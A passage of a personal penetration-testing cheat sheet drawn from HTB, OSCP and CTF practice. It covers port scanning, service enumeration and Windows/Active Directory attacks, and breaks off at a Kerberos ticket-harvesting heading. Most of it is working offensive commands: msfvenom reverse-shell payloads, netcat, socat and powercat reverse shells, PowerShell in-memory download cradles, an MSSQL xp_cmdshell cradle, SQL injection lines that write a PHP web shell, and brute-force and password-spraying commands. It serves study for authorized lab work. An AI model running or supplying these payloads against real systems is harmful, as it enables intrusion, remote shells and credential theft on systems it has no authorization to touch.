# Boot2Root cheatsheet

> personal cheathsheet populated via my [HTB](https://www.hackthebox.eu/), [Vulnhub](https://www.vulnhub.com/), [THM](https://tryhackme.com/dashboard), [OSCP](https://www.offensive-security.com/pwk-oscp/) and CTF experience.

## Summary

- [🗺️ **Common tasks/tools**](#user-content-️-common-taskstools)
    + [🐍 Python](#-python)
    + [💀`MSFvenom`](#msfvenom)
    + [`PowerShell`](#powershell)
    + [😺 `netcat`, `socat` and `powercat`](#-netcat-socat-and-powercat)
    + [🔐 Cracking passwords hashes with `hashcat` and `john`](#-cracking-passwords-hashes-with-hashcat-and-john)
    + [💉 Stack Buffer Overflow Shellcode Exploit (Skeleton)](#-stack-buffer-overflow-shellcode-exploit-skeleton)
    + [🦾 Miscellaneous](#-miscellaneous)
- [👀 **Enumeration / Reconnaissance**](#-enumeration--reconnaissance)
    + [👁️ Port Scanning (Active Information Gathering)](#user-content-️-port-scanning-active-information-gathering)
        * [`nmap`](#nmap)
        * [`masscan`](#masscan)
    + [🔍 OSINT Tools (Passive Information Gathering)](#-osint-tools-passive-information-gathering)
        * [Search Engine "Hacking" (Google Dorks)](#search-engine-hacking-google-dorks)
- [🌐 **Common services/ports**](#-common-servicesports)
    + [TCP Port 21 (FTP)](#tcp-port-21-ftp)
    + [TCP Port 22 (SSH)](#tcp-port-22-ssh)
        * [Transferring files via `scp`](#transferring-files-via-scp)
        * [Port forwarding](#port-forwarding)
        * [Bruteforce](#bruteforce)
    + [TCP Port 53 (DNS)](#tcp-port-53-dns)
        * [Subdomains enumeration](#subdomains-enumeration)
        * [Zone Transfer](#zone-transfer)
    + [TCP Port 79 (Finger)](#tcp-port-79-finger)
    + [TCP Port 80/443 (HTTP/HTTPS)](#tcp-port-80443-httphttps)
        * [Looking for “hidden” directories/files](#looking-for-hidden-directoriesfiles)
        * [Looking for subdmains](#looking-for-subdmains)
        * [Bruteforce](#bruteforce-1)
        * [Vulnerability scan](#vulnerability-scan)
        * [Wordpress (`wpscan`)](#wordpress-wpscan)
        * [Examples of common SQLi payloads](#examples-of-common-sqli-payloads)
    + [TCP Port 110/995 (POP3)](#tcp-port-110995-pop3)
    + [TCP Port 389 (LDAP)](#tcp-port-389-ldap)
    + [TCP Port 445 (SMB - Samba)](#tcp-port-445-smb---samba)
    + [TCP Port 3306 (MySQL)](#tcp-port-3306-mysql)
    + [TCP Port 5432 (PostgreSQL)](#tcp-port-5432-postgresql)
- [**Windows**](#windows)
    + [Shell](#shell)
    + [TCP Port 135 (RPC)](#tcp-port-135-rpc)
    + [TCP Port 139 (NetBIOS)](#tcp-port-139-netbios)
    + [UDP Port 161 (SNMP)](#udp-port-161-snmp)
    + [TCP Port 1433 (MSSQL - Microsoft SQL Server)](#user-content-tcp-port-1433-mssql---microsoft-sql-server)
    + [TCP Port 1521 (Oracle TNS Listener)](#tcp-port-1521-oracle-tns-listener)
    + [TCP Port 3389 (RDP)](#tcp-port-3389-rdp)
        * [Bruteforce with `crowbar`](#bruteforce-with-crowbar)
    + [Active directory enumeration](#active-directory-enumeration)
        * [👀 `PowerView.ps1`](#-powerviewps1)
        * [🐶 `SharpHound` + `Bloodhound`](#-sharphound-bloodhound)
        * [🍾 Password spraying](#-password-spraying)
    + [Kerberos (TCP port 88)](#kerberos-tcp-port-88)
        * [Enumerating users](#enumerating-users)
        * [Harvesting tickets](#harvesting-tickets)
        * [Kerberoasting](#kerberoasting)
        * [AS-REP Roasting](#as-rep-roasting)
        * [🛂 Pass The ticket](#-pass-the-ticket)
        * [🎟️ Silver ticket (`mimikatz`)](#user-content-️-silver-ticket-mimikatz)
        * [🎫 Golden ticket (`mimikatz`)](#-golden-ticket-mimikatz)
    + [🧗‍♂️ Privesc](#user-content-️-privesc)
        * [🕵️ Enumeration](#user-content-️-enumeration)
        * [🗃️ Sensitive Files](#user-content-️-sensitive-files)
        * [🧐 Checking Privileges](#-checking-privileges)
        * [💥 Kernel exploits](#-kernel-exploits)
        * [🏹 Exploiting services](#-exploiting-services)
    + [🥝 Dumping hashes and tickets with `Mimikatz`](#-dumping-hashes-and-tickets-with-mimikatz)
    + [↔️ Post-exploitation, Pivoting and Lateral Movement](#user-content-️-post-exploitation-pivoting-and-lateral-movement)
    + [🔁 Port forwarding and Tunneling](#-port-forwarding-and-tunneling)
        * [MSF `autoroute`](#metasploit-autoroute) 
        * [`plink.exe`](#plinkexe)
        * [`Netsh`](#netsh)
    + [🤠 Client-side attack](#-client-side-attack)
        * [🖱️HTA application](#user-content-️hta-application)
        * [🖥️ Office documents](#user-content-️-office-documents)
    + [🛡️ Antivirus Evasion](#user-content-antivirus-evasion)
        * [Types of Detection](#types-of-detection)
        * [Methods to Bypass Detection](#methods-to-bypass-detection)
        * [Tools to Bypass Detection](#tools-to-bypass-detection)
    + [🛠️ Useful Windows Tools](#user-content-useful-windows-tools)
    + [Useful Windows / AD links](#useful-windows-ad-links)
- [🐧 **Linux**](#-linux)
    + [Small Tips](#small-tips)
        * [Cross-compiling](#cross-compiling)
    + [🔁 Port forwarding and Tunneling](#-port-forwarding-and-tunneling-1)
    + [🧑‍💻 Bash Scripting](#-bash-scripting)
        * [Variables](#variables)
        * [Arguments](#arguments)
        * [Reading User Input](#reading-user-input)
        * [If, Else Statements](#if-else-statements)
        * [Loops](#loops)
        * [Functions](#functions)
        * [Passing arguments](#passing-arguments)
    + [TCP Port 2049 (NFS)](#tcp-port-2049-nfs)
    + [🧗‍♂️ Privesc](#user-content-️-privesc-1)
        * [🕵️ Enumeration](#user-content-️-enumeration-1)
        * [🛠️ Linux Privesc Tools](#user-content-️-linux-privesc-tools)
- [Useful links](#useful-links)

___

# 🗺️ Common tasks/tools

## 🐍 Python

- Spawning TTY Shell:
    
    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
    
    - Upgrade shell:
        - `export TERM=xterm` then `Ctrl + Z`
        - Finally, `stty raw -echo; fg`
- Running an HTTP Server:
    
    ```bash
    python3 -m http.server <PORT>
    ```
    
- Transferring file from Linux to Windows ⬇️
    - **Example**: running an SMB server:
        
        ```bash
        python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
        ```
        
        - (Windows) Copy file from SMB server:
            
            ```powershell
            copy \\<IP>\kali\<filename> C:\Temp\<filename>
            ```   
    
➡️ [File transfer techniques](https://github.com/amirr0r/notes/blob/master/Infosec/Pentest/file-transfer.md)

- Quick Port scanner:
  ```python
  #!/usr/bin/env python3
  import socket

  host = str(input("Host: "))
  #port = int(input("Port: "))
  print(f"Scanning \033[92m{host}\033[0m")
  for port in range(1,65535):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = s.connect_ex((host,port))
    if result == 0:
      print(f'{port} is \033[92mopen\033[0m')
    #else: 
    #    print(f'{port} is \033[93mclosed\033[0m')
  ```

## 💀`MSFvenom`

- Generating a reverse shell executable:
    - Staged ⇒ `windows/shell/reverse_tcp` (sent in multiple parts)
    - Non-staged ⇒ `windows/shell_reverse_tcp` (sent in its entirety along with the exploit)
    
    ```bash
    # Windows
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(vpnip) LPORT=1234 -f exe -o reverse-shell.exe
    # Linux
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=$(vpnip) LPORT=53 -f elf -o reverse-shell.elf
    # WAR (Java application such as Tomcat)
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$(vpnip) LPORT=53 -f war -o reverse-shell.war
    # HTA attack (can be used in Macros)
    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o evil.hta
    # ASPX (IIS for example if PUT is allowed)
    msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=$(vpnip) LPORT=1234 -o shell.aspx
    ```
    
    - `-e <ENCODER> -i <NUMBER OF ITERATIONS>`
        - for instance ⇒ `-e x86/shikata_ga_nai -i 9`

## `PowerShell`

- Reverse shell using [Nishang](https://github.com/samratashok/nishang#nishang) ⬇️
    
    ```bash
    cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
    echo "" >> shell.ps1
    echo "Invoke-PowerShellTcp -Reverse -IPAddress $(vpnip) -Port 443" >> shell.ps1
    ```
    
- Execute a remote script in memory (do not write to disk):
    
    ```powershell
    powershell -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1');"
    ```
    
- Download a file (alternative to `wget`):
    
    ```powershell
    powershell -command "(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$FILE', 'c:\Windows\System32\spool\drivers\color\$FILE')"
    ```
    
    > `c:\Windows\System32\spool\drivers\color\` is a world-writable directory.
    
- Run as Administrator:
    
    ```powershell
    powershell.exe Start-Process cmd.exe -Verb runAs
    ```
    

## 😺 `netcat`, `socat` and `powercat`

> [https://blog.gentilkiwi.com/programmes/socat](https://blog.gentilkiwi.com/programmes/socat)
 
- Remote connection (Client)
    
    ```bash
    nc $IP $PORT
    socat - TCP4:$IP:$PORT
    ```
    
- Listening for connections (Server)
    
    ```bash
    nc -lvnp $PORT
    socat TCP4-LISTEN:$PORT STDOUT
    ```
    
- File transfer:
    - Sender (Server):
        
        ```bash
        nc -nlvp $PORT > $FILE
        socat TCP4-LISTEN:$PORT,fork file:$FILE
        powercat -c $IP -p $PORT -i $FILE
        ```
        
    - Receiver (client):
        
        ```bash
        nc -nv $IP $PORT < $FILE
        socat TCP4:$IP:$PORT file:$FILE,create
        ```
        
- Reverse shell:
    
    ```bash
    # Victim
    nc $IP $PORT -e /bin/bash
    socat TCP4:$IP:$PORT EXEC:/bin/bash
    # Server
    # ... same as Listening for connections (Server)
    # PowerCat
    powercat -c $IP -p $PORT -e cmd.exe
    # Variation (Stand-Alone Base64 Payload)
    powercat -c $IP -p $PORT -e cmd.exe -ge > reverseshell.ps1
    powershell -E <BASE64_CONTENT>
    ```
    
- (Encrypted) Bind shell:
    - `socat`:
        
        ```bash
        # Generate a certificate
        openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
        # Convert into a format socat will accept
        cat bind_shell.key bind_shell.crt > bind_shell.pem
        ```
        
        - Listener:
            
            ```bash
            socat OPENSSL-LISTEN:$PORT,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
            ```
            
        - Client:
            
            ```bash
            socat - OPENSSL:$IP:$PORT,verify=0
            ```
            
    - `powercat`:
        
        ```powershell
        powercat -l -p $PORT -e cmd.exe
        ```
        

## 🔐 Cracking passwords hashes with `hashcat` and `john`

- Identifying hash with `hashid <hash>`
- `hashcat`: [hashcat - example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
    
    ```bash
    hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt
    ```
    Rule-based Attack:
    - `-r /usr/share/hashcat/rules/best64.rule`
    - `-r /usr/share/hashcat/rules/add-year.rule`
    
    Mask based attack:
    - `?u?l?l?l?l?l?l?l?d` (uppers, lowers and numbers) => `hashcat --help` to see the charset
    - `-1 ?d?s` defines a custom charset (digits and specials)
    
    > We can combine them: `hashcat ... -1 ?d?s ?u?l?l?l?l?l?l?l?1`
    
    - `.hcmask` files can be used to try different lengths
    - Masks can even have static strings defined such as `Mimiron?d?s` for instance
    
    > Check also combinator (`-j`, `-k`) and hybrid mask (`-a 6`, `-a 7`) as well as [`kwprocessor`](https://github.com/hashcat/kwprocessor)

- `john` aka "John The Ripper":
    
    `john hash.txt [--wordlist=list.txt] [--rules] [--format=<format>]`
    
    - `unshadow`
    - `ssh2john $SSH_ENCRYPTED_KEY > id_rsa.john`
    - `zip2john $ZIP_FILE > $ZIP_FILENAME.john`
    - `kirbi2john`

➡️ [crackstation.net](https://crackstation.net/)

## 💉 Stack Buffer Overflow Shellcode Exploit (Skeleton)

➡️ [My skeleton script](https://github.com/amirr0r/notes/blob/master/Infosec/Pwn/shellcode-stack-buffer-overflow-exploit-skeleton.py) (for both Linux and Windows)

- Pattern create + offset:
	+ `msf-pattern_create -l $PATTERN_SIZE` (or `pattern_create.rb`)
	+ `msf-pattern_offset -q $EIP_ADDRESS` (or `pattern_offset.rb`)

- **Mona.py** tricks (using Immunity Debugger):
	+ `!mona modules` => get information about all DLLs (or modules) loaded by the program 	
	+ `!mona bytearray` => generate an array with all characters
	+ `!mona compare -f bytearray.bin -a [address where array begins -> ESP]` => byte by byte comparison between **bytearray.bin** and an area in memory
	+ `!mona find -s "\xff\xe4" -m "<suitable_module>"` => find specific opcode in 
		* Find opcode of an assembly instruction (`JMP ESP` example):
		```bash
		kali@kali:~$ msf-nasm_shell
		nasm > jmp esp
		00000000 FFE4
		jmp esp
		```

- `ERC.Xdbg` tricks (using `x64dbg`):
	+ `ERC --ModuleInfo -NXCompat` => list of all loaded files by the program
	+ `ERC --config SetWorkingDirectory C:\Users\user\Desktop\` => set a default working directory to have all output files saved to
	+ `ERC --bytearray` => generate an array with all characters into two files **ByteArray_1.txt** and **ByteArray_1.bin**
	+ `ERC --compare <ESP_ADDRESS> C:\Users\user\Desktop\ByteArray_1.bin` => byte by byte comparison between an area in memory and the bytes of the file generated with the command above

## 🦾 Miscellaneous

- Metasploit:
    - `msfconsole -r script.rc`
    - `msfconsole -qx "use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; set AutoRunScript post/windows/manage/migrate; run"`
    	+ `set Proxies socks5:127.0.0.1:1080; set ReverseAllowProxy true` 
- [Empire](https://github.com/BC-SECURITY/Empire)
- Simple Port Scan in Bash:
    
    ```bash
    #!/bin/bash
    for port in {1..65535}; do
        timeout .1 bash -c "echo >/dev/tcp/<IP>/$port" &&
        echo "port $port is open"
    done
    echo "Scan complete!"
    ```
    
- One liner Ping Sweep:
    - Windows:
        
        ```powershell
        for /L %i in (1,1,255) do @ping -n 1 -w 200 10.10.10.%i > nul && echo 10.10.10.%i is up.
        ```
        
    - Linux:
        
        ```bash
        #!/bin/bash
        
        for i in {1..254}
        do
        	ip="10.10.10.$i"
        	ping -c 1 $ip >/dev/null 2>&1 && echo -e "$ip is\e[32m UP \e[0m" || echo -e "$ip is\e[31m unreachable \e[0m" 
        done
        ```
        

---

# 👀 Enumeration / Reconnaissance

## 👁️ Port Scanning (Active **Information Gathering)**

### `nmap`

> Some options require root privileges for *[raw sockets](https://man7.org/linux/man-pages/man7/raw.7.html)* access.
 

Common options:

- <u>TCP Scanning</u>:
    - **Connect Scanning (`-sT`):** perform the three-way handshake
        - 👍 It does not require the raw sockets privileges
    - **[Stealth / SYN Scanning](https://nmap.org/book/synscan.html) (`-sS`):** send SYN packets without completing a TCP handshake. If a SYN-ACK is sent back from the target machine, the port is considered open.
        - 👎 It requires the raw sockets privileges

- <u>UDP Scanning</u>: `-sU`
    
    **Tip**: It can also be used in conjunction with `-sS`
    
    Two methods:
    
    1. Send an empty ICMP packet to a given port. If the port is closed, the target should respond with an *"ICMP port unreachable"* message
    2. For common ports, will send protocol-specific packet waiting for a response

- <u>OS Fingerprinting</u>: possible thanks to **different implementations of the TCP/IP stack** (such as default TTL values) and a comparison to a known list

- <u>Service (version) Enumeration</u>:
    - `-sV` ⇒ identify services running by inspecting service banners
    - `-A` ⇒ enable OS and version detection, script scanning, and **traceroute**

- <u>Nmap Scripting Engine (NSE)</u>: scripts that automate a lot of tasks (authentication, brute force, DNS enumeration, vulnerability identification/exploitation and so on.)
    - Located in `/usr/share/nmap/scripts`
    - `--script=<script name>`
    - `--script-help <script name>`

### `masscan`

> "Can scan the entire Internet in under 5 minutes" according to its Github's description ➡️ [masscan](https://github.com/robertdavidgraham/masscan) (implements a custom TCP/IP stack)
 

## 🔍 **OSINT Tools (Passive Information Gathering)**

- [shodan.io](https://www.shodan.io/)
- [recon-ng](https://github.com/lanmaster53/recon-ng)
- [netcraft](https://www.netcraft.com/)
- Web:
    - [theHarvester](https://github.com/laramies/theHarvester)
    - [securityheaders.com](https://securityheaders.com/)
    - [ssltest](https://www.ssllabs.com/ssltest/)
- Frameworks:
    - [Maltego](https://www.maltego.com)
    - [osintframework.com](https://osintframework.com/)
- Source code:
    - [gitrob](https://github.com/michenriksen/gitrob)
    - [gitleaks](https://github.com/zricethezav/gitleaks)
- Social Media:
    - [linkedin2username](https://github.com/initstring/linkedin2username)
    - [twofi](https://digi.ninja/projects/twofi.php)
    - [social-searcher.com](https://www.social-searcher.com/)
    - [pipl](https://pipl.com)

### Search Engine "Hacking" (Google Dorks)

> [https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database)
 
- `site:` ➡️ searches to a single domain
- `filetype:` ➡️ limits search results to the specified file type
- `ext:` ➡️ discern what programming languages might be used on
a web site. Searches like `ext:jsp`, `ext:cfm`, `ext:pl` will find indexed **Java Server Pages**, **Coldfusion**, and Perl pages respectively,
- `intitle:` ➡️ contains specific string in web page title.
- `intext:` ➡️ contains specific string in web page content.
- adding a `-` in front of an operator will exclude particular items

---

# 🌐 Common services/ports

## TCP Port 21 (FTP)

`ftp $TARGET`

- Check if you can log in as `annonymous`
- Download all folders recursively: `wget -r ftp://user:pass@server.com/`

## TCP Port 22 (SSH)

- Connect to remote server with private key:
    
    `ssh -i $KEY_FILE $USER@$TARGET`
    
- Fix common key exchange issue:
    
    `ssh -oKexAlgorithms=+diffie-hellman-group1-sha1`

### Transferring files via `scp`
    
- Copy a local file to a remote host: `scp $LFILE $USER@$TARGET:$RFILE`
        
- Copy a file from a remote host to a local directory: `scp $USER@$TARGET:$RFILE $LDIR`
    
### Port forwarding

**SSH port forwards can be run as non-root users as long as we only bind unused non-privileged local ports (above 1024).**

> In case we don't have a fully interactive shell: `-o "UserKnownHostsFile=/dev/null"` prevents ssh from attempting to save the host key and `-o "StrictHostKeyChecking=no"` will instruct ssh to not prompt us to accept the host.

- Remote Port forwarding:
    
    `ssh -N -R $RHOST:$RPORT:127.0.0.1:$LPORT $USER@$RHOST`
    
- Local Port forwarding:
    
    `ssh -N -L $LHOST:$LPORT:$RHOST:$RPORT $USER@$TARGET`
    
- Dynamic Port Forwarding (create a local SOCKS4 application proxy):
    
    `ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>`
    
    - `/etc/proxychains.conf`:
        
        ```bash
        # ...
        [ProxyList]
        # add proxy here ...
        # meanwile
        # defaults set to "tor"
        # socks4 <address to bind to> <port to bind to>
        socks4 127.0.0.1 9050 # for instance
        ```
        
        We can also write a `proxychains.conf` in our current directory or in the user's home directory (`$(HOME)/.proxychains`)    
    
    💡`nmap` with `proxychains`: `proxychains nmap -sT -Pn $TARGET`      

### Bruteforce

- Bruteforce private key:
    
    ```bash
    /usr/share/john/ssh2john.py id_rsa.bak > $USER.john
    
    john $USER.john --wordlist=/usr/share/wordlists/rockyou.txt
    ```
    
- Bruteforce connection:
    - **medusa**: `medusa -h $TARGET -U $USER_WORDLIST -P $PASSWORD_WORDLIST -M ssh`
    - **hydra**: `hydra -L $USER_WORDLIST -P $PASSWORD_WORDLIST $TARGET ssh`

## TCP Port 53 (DNS)

```bash
host $domain        # return IP address for this server
host -t ns $domain  # list DNS servers (ns for name servers)
host -t mx $domain  # list Mail servers (mx for mail exchange)
host -t txt $domain # list TXT records 
```

### Subdomains enumeration

```bash
dnsrecon -d $domain -D ~/list.txt -t br
for sub in $(cat list.txt); do host $sub.$domain; done
```

### Zone Transfer

> A zone transfer is a database replication between related DNS servers in which the zone file is copied from a master DNS server to a slave server. Obviously, **it should only be allowed to authorized slave DNS servers**. [[zonetransfer.me](http://zonetransfer.me)]
 

```bash
dig axfr @$IP [domain]
dnsrecon -d $DOMAIN -t axfr
host -l $DOMAIN $SUBDOMAIN
```

## TCP Port 79 (Finger)

- [Pentestmonkey script](https://github.com/pentestmonkey/finger-user-enum/blob/master/finger-user-enum.pl) :`./finger-user-enum.pl -U $USERNAME_WORDLIST -t $TARGET`
- `Metasploit` module: `use auxiliary/scanner/finger/finger_users`

➡️ [Hacktricks - pentesting finger](https://book.hacktricks.xyz/pentesting/pentesting-finger)

## TCP Port 80/443 (HTTP/HTTPS)

### Looking for “hidden” directories/files

```bash
# dirb
dirb http://$IP -o dirb.txt
# gobuster
[HTTP_PROXY="socks5://127.0.0.1:1080/"] gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt -o gobuster.txt
```

- specific extension:
    
    ```bash
    # dirb
    dirb http://$IP -X .<extension> -o dirb.txt
    
    # gobuster
    gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt -x .<ext1>,.<ext2> -o gobuster.txt
    ```
    
- ignore SSL error (gobuster): `gobuster dir -u https://$IP -w /usr/share/dirb/wordlists/common.txt -o gobuster.txt -k`

### Looking for subdmains

`gobuster dns -d $DOMAIN -w $WORDLIST`

### Bruteforce

HTTP htaccess: `medusa -h $IP -u $USERNAME -P $WORDLIST -M http -m DIR:/`$DIRECTORY

**WordPress** example:

```bash
hydra [-L $USER_LIST|-l $USERNAME] [-P $PASSWORD_LIST|-p $PASSWORD] $TARGET [http-get-form|http-post-form] '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

- `/wp-login.php` has to be replace by `action` value in HTML form
- `log` & `pwd` can be `username` & `password` (it depends on the name attributes values in form)
- `wp-submit=Log+In` → text value of the submit button
- `F=Invalid username` → failure message

➡️ custom wordlist generator: `cewl http://$TARGET`

### Vulnerability scan

- generic: `nikto -h $TARGET`
- WordPress: `wpscan --url http://$TARGET`

### Wordpress (`wpscan`)

- Get an API TOKEN from [wpscan.com](https://wpscan.com/wordpress-security-scanner)
    - `export WPSCAN_API_TOKEN=<API_TOKEN>` into `~/.bashrc`
    - in `~/.wpscan/scan.yml`:
        
        ```yaml
        cli_options:
         	api_token: <API_TOKEN>
        ```
        

```bash
# Enumerating users
wpscan --url http://<IP>/ --enumerate u
# Bruteforcing passwords
wpscan --url http://<IP>/ --password-attack wp-login -U admin -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt -t 50
```

### Examples of common SQLi payloads

- Authentication bypass ➡️ `' or 1=1 LIMIT 1;#`
- Enumerate version ➡️ `?id=1 union all select 1, 2, @@version`
- Enumerate database user ➡️ `?id=1 union all select 1, 2, user()`
- Enumerate table names ➡️ `?id=1 union all select 1, 2, table_name from information_schema.tables`
- Enumerate users table ➡️ `?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'`
- Get usernames and passwords from users table ➡️ `?id=1 union all select 1, username, password from users`
- (Windows) Reading file attempt ➡️ `?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')`
- (Windows) Writing file attempt  ➡️ `?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
- (Linux) Reading file attempt ➡️ `?id=1 union all select 1, 2, load_file('/etc/passwd')`
- (Windows) Writing file attempt  ➡️ `?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/ww/html/backdoor.php'`

## TCP Port 110/995 (POP3)

```bash
for user in $(cat users.txt); 
do ( echo USER ${user}; sleep 2s; echo PASS password; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC $IP 110;
done
```

## TCP Port 389 (LDAP)

- `ldapsearch -h <IP> -x -s base namingcontexts`
- `ldapsearch -h <IP> -x -b "<distinguishedName>" | grep "^dn"`

## TCP Port 445 (SMB - Samba)

- Listing directories: `smbclient -L //<IP>/<Sharename> -U "username%password"`
    - In case of a smb shell, we can download all files by doing:
        
        ```
        smb: \> recurse ON
        smb: \> prompt OFF
        smb: \> mget *
        ```
        
- (Recursive search) Listing directories and permissions: `smbmap -H $TARGET -R | tee smbmap.txt`
- “Manual” bruteforce:
    
    ```bash
    for u in $(cat usernames.txt); do echo "User: $u"; smbclient -L //<IP>/ -U "$u%$u"; done
    ```
    
- Enumerating shares: `crackmapexec smb $TARGET --shares`
- Bruteforce usernames and passwords: `crackmapexec smb $IP -u usernames.txt -p passwords.txt`
- NMAP SMB user: `--script=smb-enum-users`

## TCP Port 3306 (MySQL)

- Remote connection:
    
    ```bash
    mysql -u $USER --password -h $TARGET [$DATABASE]
    ```
    
- Dumping DB:
    
    ```bash
    mysqldump -h $TARGET -u $USER -p $DATABASE > $DATABASE.sql
    ```
    
Useful links:

- [MySQL Commands](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)
- [SQl.sh](https://sql.sh/)

## TCP Port 5432 (PostgreSQL)

Connect to database; user will be prompted for password: 

```bash
psql -h {{host}} -p {{port}} -U {{username}} -W {{database}}
```

---

<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Windows_logo_-_2012.svg/2048px-Windows_logo_-_2012.svg.png" align="left" height="35"/>

# Windows

## Shell

- (`gem install evil-winrm`) `evil-winrm -i <ip> -u <username> -p <password>`
- `winexe -U '<username>%<password>' //<IP> cmd.exe`

## TCP Port 135 (RPC)

```bash
rpcclient -U "" $IP
rpcclient $> srvinfo       # identify the specific OS version
rpcclient $> enumdomusers  # display a list of users names defined on the server
rpcclient $> getdompwinfo  # get SMB password policy
rpcclient $> querydispinfo # get users info
```

## TCP Port 139 (NetBIOS)

```bash
nmap -sU --open -p 161 <IP>
nbtscan -r <IP>
```

## UDP Port 161 (SNMP)

`snmpwalk`

- Enumerating the Entire MIB Tree:
    
    ```bash
    snmpwalk -c public -v1 -t 10 <IP>
    ```
    
- Enumerating Windows Users:
    
    ```bash
    snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25
    ```
    
- Enumerating Running Windows Processes:
    
    ```bash
    snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2
    ```
    
- Enumerating open TCP ports:
    
    ```bash
    snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3
    ```
    
- Enumerating Installed Software:
    
    ```bash
    snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2
    ```
    

> See `snmpcheck`
 
## TCP Port 1433 (MSSQL - Microsoft SQL Server)

`mssqlclient.py` from **Impacket**

```bash
mssqlclient.py $DOMAIN/$USERNAME:$PASSWORD@$IP
```
- Reverse shell (PowerShell example): 
	```SQL
	SQL> enable_xp_cmdshell
	SQL> xp_cmdshell whoami /all
	SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://$IP/shell.ps1") | powershell -noprofile'
	```

## TCP Port 1521 (Oracle TNS Listener)

```bash
git clone https://github.com/quentinhardy/odat.git
cd oda
pip3 install python-libnmap
pip3 install cx_oracle
python3 odat.py all -s <IP> -p <PORT>
```

## TCP Port 3389 (RDP)

```bash
xfreerdp /u:<USER> /p:<PASS> /v:<IP> /cert:ignore

rdesktop -u <USER> -p <PASS> <IP>:3389
```

### Bruteforce with `crowbar`

> supports OpenVPN, Remote Desktop Protocol, SSH Private Keys and VNC Keys
 

```bash
crowbar -b rdp -s $IP/$NETMASK -u $USERNAME -C $WORDLIST -n 1
```

## Active directory enumeration

- Enumerate all local accounts: `net user`
- Enumerate all users in the entire domain: `net user /domain`
- Enumerate all groups in the entire domain: `net group /domain`
- Looking for **Nested Groups** (groups type cab be member of other groups): TODO...

➡️ [Get-SPN.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Get-SPN.ps1)

Requesting a service ticket for a given Service Principal Name (SPN):

```powershell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<SPN>'
```

### 👀 `PowerView.ps1`

- Enumerating operating system:
    
    ```powershell
    Get-NetComputer -FullData | select operatingsystem*
    ```
    
- Enumerating domain users:
    
    ```powershell
    Get-NetUser | select cn
    ```
    
- Enumerating logged-in users:
    
    ```powershell
    Get-NetLoggedon -ComputerName <COMPUTER_NAME>
    ```
    
- Enumerating domain groups:
    
    ```powershell
    Get-NetGroup -GroupName *admin*
    ```
    
- Enumerating shared folders:
    
    ```powershell
    Get-WmiObject -class Win32_Share
    ```

➡️ [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

➡️ [PowerView-3.0-tricks.ps1](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### 🐶 `SharpHound` + `Bloodhound`

1. Collecting data with `SharpHound`:
    
    ```powershell
    C:\> powershell -ep bypass
    PS C:\> . .\Downloads\SharpHound.ps1
    PS C:\> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
    ```
    
2. Transferring the **loot.zip** folder to our Attacker Machine (`scp`, **smb** → `copy`, etc.)
3. Mapping the network with `BloodHound`:
    
    ```bash
    apt install -y bloodhound
    # Open a terminal and type the following:
    neo4j console # default credentials -> neo4j:neo4j
    # In another terminal, open bloodhound:
    bloodhound
    ```
    
    - Drag and drop the **loot.zip** folder into Bloodhound in order to import the **.json** files

➡️ [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)

Remote Enum with `bloodhound-python` :

```bash
pip install bloodhound 
bloodhound-python -d $DOMAIN -u $USER -p $PASSWORD -c all -ns $TARGET
```

### 🍾 Password spraying

```powershell
.\Rubeus.exe brute /password:<PASSWORD> /noticket
```

➡️ [Spray-Passwords.ps1](https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1) can also be used to perform a spraying attack.

```powershell
.\Spray-Passwords.ps1 -File .\passwords.txt -Verbose
```

➡️ https://github.com/Greenwolf/Spray

> **TODO**: remote password spraying?
 

## Kerberos (TCP port 88)

### Enumerating users

```bash
./kerbrute userenum --dc <DC> -d <DOMAIN> <USERNAME_WORDLIST_FILENAME>
```

### Harvesting tickets

